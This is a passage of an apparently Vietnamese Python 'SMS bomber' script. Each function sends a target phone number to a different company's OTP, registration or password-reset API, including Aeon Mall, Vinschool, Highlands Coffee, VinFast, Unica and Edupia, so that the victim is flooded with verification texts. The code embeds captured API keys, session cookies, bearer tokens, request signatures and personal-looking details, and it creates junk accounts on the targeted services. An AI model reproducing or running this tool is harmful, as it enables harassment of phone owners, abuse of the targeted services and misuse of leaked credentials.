        'content-type': 'application/x-www-form-urlencoded; charset=utf-8',
        'lang': 'vi',
        'user-agent': 'AeonMall/2.37 (com.aeonmall-vietnam; build:1; iOS 15.8.2) Alamofire/5.9.1',
        'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9, zh-Hans-VN;q=0.8, zh-Hant-VN;q=0.7',
    }

    data = {
        'birthday': '1999-12-21',
        'district_id': '71',
        'email': 'soeasyvn1337@gmail.com',
        'full_name': 'tran dat',
        'gender': '0',
        'identification_number': '1207036448',
        'introduction_store': '',
        'password': '123123aA@',
        'phone': sdt,
        'province_id': '6',
        'referrer_code': '',
        'register_mall_id': '15',
        'register_membership': '1',
        'ward_id': '1252',
    }

    try:
        response = requests.post('https://api.aeonmall-vietnam.com/api/loyalty/app/customers/register', headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("AEONMALL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("AEONMALL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinschool(): #ap
    headers = {
        'Host': 'one-api.vinschool.edu.vn',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'cache-control': 'no-store',
        'user-agent': 'Vinschool/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone_number': sdt,
        'unique_id': '274889DD-7051-4F23-9A28-F54E73F77A9A',
    }

    try:
        response = requests.post(
            'https://one-api.vinschool.edu.vn/api/master-data/v2/account/login/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINSCHOOL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINSCHOOL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def homeid(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/7.3.0/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'asia.homeid',
        'user-agent': 'FirebaseAuth.iOS/7.3.0 asia.homeid/1.1.6 iPhone/15.8.2 hw/iPhone9_3',
        'accept-language': 'vi',
    }

    params = {
        'key': 'AIzaSyBMwQDLKUqLZskG_4QBWSU79RUCYeXclwQ',
    }

    json_data = {
        'iosReceipt': 'AEFDNu_9qDiFRHvwruvGQjzmiO9YoKu03VGru0yCGiM6oKh6PfOTvTNPb5S2uv2EPQeHYSj_aMc9G71N3IMexyRojZqWz5g2z9rTFplJn__93x-tJkJge7g',
        'iosSecret': '1UHmX596jgq1PjGV',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HOMEID | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HOMEID | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def highlands(): #ap 
    cookies = {
        '.diadiem.Session': 'CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU',
        'route': '1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
    }

    headers = {
        'Host': 'api-app.highlandscoffee.com.vn',
        # 'Cookie': '.diadiem.Session=CfDJ8PoFpWVp%2FpdMhR9HbDRDTjvQ3P9oiWq7sLAZDIAEIJQkq1BCCexcaXOOw8h2osc2O%2B%2BbBmX%2F9TgsuKk35ZhirG%2B%2BZ0OyTD6CoQLnnRPN3I%2BtfIDD%2BJr70J8%2F9XnoUu0%2B%2BkcY2YLmrP0lKTsNgRvIhNFewRV0rfR7gdO7zje9PxnU; route=1734771032.298.37.687218|d5b38695e274be05122762aeb7f81e07',
        'content-type': 'application/json',
        'accept': 'application/json',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjBhYmUxZmFlLWI4YzUtNDhmYy1iYzhjLTVlOTA5ODNjY2VmNyJ9.eyJVc2VyR3VpZCI6IkN1c3RvbWVyLzIiLCJEZXZpY2VHdWlkIjoiRGV2aWNlLzQiLCJMb2NhdGlvbkd1aWQiOiJMb2NhdGlvbi80IiwiS2V5RGV2aWNlIjoiRTJWQy1KTUwzLTRXWFEiLCJEZXZpY2VUeXBlIjoiMSIsIm5iZiI6MTczNDc3MTAyMCwiZXhwIjoxNzM3OTY3ODIwLCJpYXQiOjE3MzQ3NzEwMjAsImlzcyI6Imh0dHBzOi8vYXBpLWFwcC5oaWdobGFuZHNjb2ZmZWUuY29tLnZuIiwiYXVkIjoiaHR0cHM6Ly9hcGktYXBwLmhpZ2hsYW5kc2NvZmZlZS5jb20udm4ifQ.s1f5aqFBATZGDqgA69uFYle-UsEH_4mqdb8-3euaRXk',
        'x-auth-checksum': '14129e5f51e48ae7ff9d12116c80e1d33bf2c56e355412683ca33c17732e6012',
        'x-auth-timestamp': '1734771031306',
        'accept-language': 'vi',
        'x-auth-signature': 'b75377e9453f0644fce99ba40305dd1cf3371438cd03f36e92c4da19f3ca7493',
        'user-agent': 'PendoGO/4.1.15 (com.vti.highlands; build:1; iOS 15.8.2) Alamofire/5.9.1',
        'x-auth-nonce': '1734771031306155',
        'x-auth-devicecode': 'E2VC-JML3-4WXQ',
    }

    json_data = {
        'UserAccount': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://api-app.highlandscoffee.com.vn/api/v3/authentication/otp/send',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HIGHLANDS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HIGHLANDS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def meeyland(): #ap
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json',
        'origin': 'https://meeyland.com',
        'priority': 'u=1, i',
        'referer': 'https://meeyland.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-affilate-id': 'undefined',
        'x-browser-id': 'undefined',
        'x-client-id': 'meeyland',
        'x-partner-id': '',
        'x-time': '1737255198154',
        'x-token': 'MTczGlBxoNzI1NTE5ODE1NgPI3uC5HaVp1U092emh0THhYYnZPWnZWRmxGRp7FRxlBSdGlYaG53Y3F6Y3LvcUuFaTVBxTU5XZUNVdXlyaFRsrPLNaGAGA3Dts3pRFVDRlFoY2VtZFRTcVNoLjgxMmMyYjY2NTNjNTljMWEwOWZmZmExYTFkYzAyN2Iy',
    }

    json_data = {
        'target': sdt,
        'type': 'phone',
        'refCode': '',
    }

    try:
        response = requests.post('https://v3.meeyid.com/auth/v4.3/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEEYLAND | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEEYLAND | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinfastescooter(): #ap
    headers = {
        'Host': 'escooter-api.vinfast.vn',
        'content-type': 'application/json',
        'accept': 'application/json',
        'app_version': '2.25.0',
        'accept-language': 'vi-VN',
        'platform': 'Ios',
        'player_id': '8e6a098f-aeac-4c62-94a2-fd361c2a5f74',
        'user-agent': 'eScooter/2024.1213.1812 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'client_id': 'IOS00000009GNY9TB9YXKKY809QRK5SH',
        'device_id': '59A17FFC-EABF-42F6-B692-E2FC7CC39CEC',
        'os_version': 'ios15.8.2',
        'client_secret': 'IOS00009GNY9TB9YXKKY809QRK5SH9012345678901234567890123456789654',
        'device_model': 'Iphone 4.7"',
    }

    json_data = {
        'type': 'REGISTRATION',
        'mobile_number': sdt,
    }

    try:
        response = requests.post(
            'https://escooter-api.vinfast.vn/api-gateway/otp-management/v1.0/otp/generate',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINFAST E-SCOOTER | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINFAST E-SCOOTER | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def taskal(): #ap
    cookies = {
        'tio_session': '1872555885004734464',
    }
    # SRC : VINCHAT
    cookies = {
        'tio_session': '1880656085619728384',
    }

    headers = {
        'Host': 'tchat.telesafe.me',
        # 'Cookie': 'tio_session=1880656085619728384',
        'content-type': 'application/json; charset=UTF-8',
        'tio-bundleid': 'vinchat',
        'accept': '*/*',
        'tio-appversion': '1.1.8',
        'tio-deviceinfo': 'iPhone XR',
        'tio-cid': '59',
        'tio-resolution': '828,1792',
        'accept-language': 'vi-VN;q=1',
        'tio-imei': '6c452635e6b0465a9c91eb7c0c579d09',
        'tio-size': 'iPhone11,8',
        'user-agent': 'VinTalk/1.1.8 (iPhone; iOS 17.4.1; Scale/2.00)',
        'tio-operator': 'Viettel',
        'tio-idfa': '00000000-0000-0000-0000-000000000000',
    }

    data = {
        'deviceId': '6c452635e6b0465a9c91eb7c0c579d09',
        'p_is_ios': '1',
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://tchat.telesafe.me/mytio/extotp/request.tio_x', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TASKAL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TASKAL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def star_t(): #ap
    headers = {
        'Host': 'www.googleapis.com',
        'x-client-version': 'iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS',
        'content-type': 'application/json',
        'accept': '*/*',
        'x-ios-bundle-identifier': 'com.ywmobile.rocket.star',
        'user-agent': 'FirebaseAuth.iOS/6.9.2 com.ywmobile.rocket.star/2.0.24 iPhone/15.8.2 hw/iPhone9_3',
        'accept-language': 'vi',
    }

    params = {
        'key': 'AIzaSyA0EhB-nkhZxd6mkVCXg-jIwWdIcotqL8g',
    }

    json_data = {
        'iosReceipt': 'AEFDNu_6rjcr3q-KWR56_JNNvcF72llii9GifB96ncXsPIpMf1BGoW-ylljFYYGlclZ5JdvBB54WDyKA6pLJMiUKj54fePMPam87XuG2j1mKIHefOuS06OZkP2xnC_57cx_tK88',
        'iosSecret': 'FPPFuD-2vXQRJWZL',
        'phoneNumber': sdt_chuyen_doi,
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("STAR-T | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("STAR-T | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def thinkpro (): # web, code 500 check
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'priority': 'u=1, i',
        'referer': 'https://auth.onwardtogether.one/login?callback_uri=https://thinkpro.vn/auth/callback',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    params = {
        'username': sdt,
    }

    try:
        response = requests.get('https://auth.onwardtogether.one/api/send-otp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THINKPRO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THINKPRO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def nhadatvui(): #check
    cookies = {
        'XSRF-TOKEN': 'eyJpdiI6Ik0wQXF2SEordjc1WkFFTkJPSk5uWFE9PSIsInZhbHVlIjoiby9sM3ZUSGFEb0N2bGgzb0ZVVkF2eUpKZ3VjWUs0Q0ZlaGZyNktGMTRyR1U5dHJoQ1A5V2V5VnRYS2VVZm1Ha1d6Sit4dDd4K01wNGI4QUFrWjlKUWR1dU5tZXV0ZWhUTjBTaFROSWNDVTNuQXlncmhncmhaRFBYcHNaYjRTeTQiLCJtYWMiOiI2ZTA2OTBlNDViNWEzYzMzNWNkNDc3OWMzNWU4ZTVlNzNhZGU0Y2ExNDEwYmVhMDlmNWQ3NmZhZTRlNDMwY2FjIiwidGFnIjoiIn0%3D',
        'nhadatvui_session': 'eyJpdiI6IlV6OEdERG5JQjR1bHdOb1hTajA3Unc9PSIsInZhbHVlIjoiSzcvQksxN1BXVkcyME5wcUpuZS9SVWk1RVcwaHVnT0xRb1l2L1FpSmJOMVJsNHBMQVR2MjJLQnRrWEFubEI5VlBQRkJWdlI4OGRYYjVGYU9USjBRWHA4b0RnRHlSaHFMWkhvaGNSL2RYRFpDNXFRUHRUQnJhOXIvK212Mmlwdk8iLCJtYWMiOiI1MWExMjczYmYzNjM2ZDI3MmZkYWU0ZGMzMTYwZmYxYjI0ZTY1NDlkMjNhMDk5OWY2NTViM2MxMWQzZjUwMjk2IiwidGFnIjoiIn0%3D',
    }

    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        # 'Cookie': 'XSRF-TOKEN=eyJpdiI6Ik0wQXF2SEordjc1WkFFTkJPSk5uWFE9PSIsInZhbHVlIjoiby9sM3ZUSGFEb0N2bGgzb0ZVVkF2eUpKZ3VjWUs0Q0ZlaGZyNktGMTRyR1U5dHJoQ1A5V2V5VnRYS2VVZm1Ha1d6Sit4dDd4K01wNGI4QUFrWjlKUWR1dU5tZXV0ZWhUTjBTaFROSWNDVTNuQXlncmhncmhaRFBYcHNaYjRTeTQiLCJtYWMiOiI2ZTA2OTBlNDViNWEzYzMzNWNkNDc3OWMzNWU4ZTVlNzNhZGU0Y2ExNDEwYmVhMDlmNWQ3NmZhZTRlNDMwY2FjIiwidGFnIjoiIn0%3D; nhadatvui_session=eyJpdiI6IlV6OEdERG5JQjR1bHdOb1hTajA3Unc9PSIsInZhbHVlIjoiSzcvQksxN1BXVkcyME5wcUpuZS9SVWk1RVcwaHVnT0xRb1l2L1FpSmJOMVJsNHBMQVR2MjJLQnRrWEFubEI5VlBQRkJWdlI4OGRYYjVGYU9USjBRWHA4b0RnRHlSaHFMWkhvaGNSL2RYRFpDNXFRUHRUQnJhOXIvK212Mmlwdk8iLCJtYWMiOiI1MWExMjczYmYzNjM2ZDI3MmZkYWU0ZGMzMTYwZmYxYjI0ZTY1NDlkMjNhMDk5OWY2NTViM2MxMWQzZjUwMjk2IiwidGFnIjoiIn0%3D',
        'Origin': 'https://nhadatvui.vn',
        'Referer': 'https://nhadatvui.vn/user/register/phone',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        '_token': 'HCBFWbKKIdBMwowcqNHs3ygVGoGdYXybqJplHNnt',
        'g-token': '',
        'phone': sdt,
        'password': '123123aA@',
    }

    try:
        response = requests.post('https://nhadatvui.vn/user/register/phone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("NHADATVUI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("NHADATVUI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ivie(): # DEAD
    headers = {
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'MobileMode': 'user',
        'Origin': 'https://ivie.vn',
        'Referer': 'https://ivie.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'cross-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'deviceType': 'web',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'user': {
            'password': '6172ac2267e793a6c86dfd7a0a348289',
            'telephoneNumber': {
                'number': sdt,
                'dialingCode': '+84',
            },
            'role': 1,
        },
        'socialType': 1,
    }

    try:
        response = requests.post('https://api-produce.isofhcare.com/isofhcare/user/register', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("IVIE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("IVIE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def thuongdo():
    headers = {
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer',
        'content-type': 'application/json',
        'origin': 'https://client.hangve.com',
        'priority': 'u=1, i',
        'referer': 'https://client.hangve.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-organization': 'https://client.hangve.com',
    }
    random_email = generate_random_email()
    json_data = {
        'email': random_email,
        'password': '123123aA@',
        'name': 'tran dat',
        'phone_number': sdt,
        'warehouse_id': 1,
        'service': 1,
    }

    response = requests.post('https://api-client.hangve.com/api/auth/sign-up/', headers=headers, json=json_data)
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'authorization': 'Bearer',
        'origin': 'https://client.hangve.com',
        'priority': 'u=1, i',
        'referer': 'https://client.hangve.com/',
        'sec-ch-ua': '"Chromium";v="130", "Opera";v="115", "Not?A_Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 OPR/115.0.0.0',
        'x-organization': 'https://client.hangve.com',
    }

    try:
        response = requests.get(f'https://api-client.hangve.com/api/auth/reset-password/by-phone/{sdt}', headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("THUONGDO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("THUONGDO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def unica(): #ap
    headers = {
        'Host': 'id.unica.vn',
        'accept': 'application/json',
        'content-type': 'application/json',
        'user-agent': 'Unica/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }
    random_email = generate_random_email()
    json_data = {
        'full_name': 'huytrrrrddf',
        'email': random_email,
        'password': 'tttyyyuuu',
        'phone': sdt_chuyen_doi,
    }

    response = requests.post('https://id.unica.vn/api/users', headers=headers, json=json_data)
    headers = {
        'Host': 'id.unica.vn',
        'accept': 'application/json',
        'content-type': 'application/json',
        'user-agent': 'Unica/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://id.unica.vn/api/get-pin-code', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("UNICA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("UNICA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def monkeyjunior(): #ap; nhieu ap phet
    headers = {
        'Host': 'app.monkeyenglish.net',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'lang': 'vi-VN',
    }

    json_data = {
        'app_id': 2,
        'device_id': '104547954',
        'os': 'ios',
        'info': 'Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2',
        'subversion': '42.0.84',
        'device_type': 2,
        'is_test': False,
        'os_name': 'iOS',
        'type': 3,
        'phone': sdt[1:10],
        'password': '123123aa@',
        'country_code': '+84',
        'is_upgrade': False,
    }

    response = requests.post(
        'https://app.monkeyenglish.net/app/api/v2/account/authen/register',
        params=params,
        headers=headers,
        json=json_data,
    )
    headers = {
        'Host': 'app.monkeyenglish.net',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json',
        'user-agent': 'MonkeyJunior/410000799 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    params = {
        'lang': 'vi-VN',
    }

    json_data = {
        'app_id': 2,
        'device_id': '104547954',
        'os': 'ios',
        'info': 'Application Version: 42.0.84 OS: ios Model: iPhone 7 System Version: 15.8.2',
        'subversion': '42.0.84',
        'device_type': 2,
        'is_test': False,
        'os_name': 'iOS',
        'type': 1,
        'country_code': '+84',
        'phone': sdt[1:10],
        'email': '',
    }

    try:
        response = requests.post(
            'https://app.monkeyenglish.net/app/api/v1/account/send-opt-verify-pw',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MONKEYJUNIOR | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MONKEYJUNIOR | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)
    
def ngheluon(): #ap 400, check
    headers = {
        'Host': 'www.googleapis.com',
        'content-type': 'application/json',
        'baggage': 'sentry-public_key=09fb9d0e992b43108bf0c3a92a120bba,sentry-release=com.ios.ngheluon%405.1%2B2,sentry-sample_rate=1,sentry-trace_id=499ac7844eb647fb9abb3d7001e9f273,sentry-transaction=NgheLuon.MainTabViewController',
        'accept': '*/*',
        'x-client-version': 'iOS/FirebaseSDK/10.3.0/FirebaseCore-iOS',
        'x-ios-bundle-identifier': 'com.ios.ngheluon',
        'sentry-trace': '499ac7844eb647fb9abb3d7001e9f273-58e1347a20824c0c-1',
        'accept-language': 'en',
        'user-agent': 'FirebaseAuth.iOS/10.3.0 com.ios.ngheluon/5.1 iPhone/17.4.1 hw/iPhone11_8',
        'x-firebase-locale': 'VN',
        'x-firebase-gmpid': '1:486655381417:ios:3197ff2cc46ac92f',
    }

    params = {
        'key': 'AIzaSyAAWxINo37dOomatKK8tmp51nB2WAm8dRI',
    }

    json_data = {
        'iosReceipt': 'AEFDNu9vZ4kbm38JFR8_kvwYrKoC1Qg22EmYZiSoYpsDfF4mHIZI_G5rKiACi1CiazNzoUzji3mOMsVebKHHq9BqvJzHs-xGKzLLvWAyQq9DwAcSS1sCUUFtWdpUrQ',
        'iosSecret': 'XxU5oPMA8SgJRm3M',
        'phoneNumber': f'+84{sdt}',
    }

    try:
        response = requests.post(
            'https://www.googleapis.com/identitytoolkit/v3/relyingparty/sendVerificationCode',
            params=params,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("NGHE NOI | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("NGHE NOI | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def babilala():
    headers = {
        'Host': 'api.babilala.vn',
        'phone': sdt,
        'accept': '*/*',
        'lang': 'vi',
        'content-type': 'application/x-www-form-urlencoded',
        'x-unity-version': '2019.3.15f1',
        'user-agent': 'babilala/1 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
    }

    try:
        response = requests.post('https://api.babilala.vn/api/getOtp', headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BABILALA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BABILALA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def edupia(): #ap
    headers = {
        'Host': 'service3.edupia.vn',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': '',
        'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA',
        'device_name': 'thanh',
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'parent_name': 'dat sen',
        'phone': sdt,
        'product_type': '1',
        'deviceId': '',
        'source_register': 'App C1',
        'campaign_name': 'Inhouse_Edupia TH App_Há»�c thá»\xad_V2_Ä�Äƒng kÃ½',
        'product_register': -1,
        'username': '',
        'utm_source': '',
    }

    response = requests.post(
        'https://service3.edupia.vn/service/v2/users/2.1/register/create-user-trial',
        headers=headers,
        json=json_data,
    )
    cookies = {
        '_ga': 'GA1.2.1688129155.1735460145',
        '_gat_UA-116690073-3': '1',
        '_gcl_au': '1.1.1852251882.1735460145',
        '_gid': 'GA1.2.1381524696.1735460145',
    }

    headers = {
        'Host': 'api-cms-core.edupia.vn',
        # 'Cookie': '_ga=GA1.2.1688129155.1735460145; _gat_UA-116690073-3=1; _gcl_au=1.1.1852251882.1735460145; _gid=GA1.2.1381524696.1735460145',
        'accept': '*/*',
        'content-type': 'application/json',
        'x-unity-version': '2020.3.48f1',
        'user-agent': 'EDUPIA/3 CFNetwork/1335.0.3.4 Darwin/21.6.0',
        'accept-language': 'vi-VN,vi;q=0.9',
        'access-control-allow-origin': '*',
    }

    json_data = {
        'app_code': 'edupia_cap1',
        'app_version': '4.4.28',
        'device_os': 'Other',
        'device_model': 'iOS1582',
        'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148',
        'device_id': '90717ADD-D733-4132-AAF7-FB696FFE43AA',
        'device_name': 'thanh',
        'ip': '',
        'user_id': 0,
        'ApiCache': {
            'ip_cache': {
                'client_ip': '',
                'client_ip_long': '',
                'country_code': '',
                'country_name': '',
                'region_name': '',
                'latitude': '',
                'longitude': '',
                'time_zone': '',
                'zip_ocd': '',
            },
        },
        'file': [],
        'phone': sdt,
        'operation': 3,
    }

    try:
        response = requests.post(
            'https://api-cms-core.edupia.vn/api/v2/authentication/get-vcode',
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("EDUPIA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("EDUPIA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vkids(): #ap
    headers = {
        'Host': 'payment.api.deltago.com',
        'X-Unity-Version': '2021.3.12f1',
        'Accept': '*/*',
        'app_version': '2.13.0',
        'device_info': 'iPhone9,3',
        'lang_code': 'vi',
        'user_id': '0',
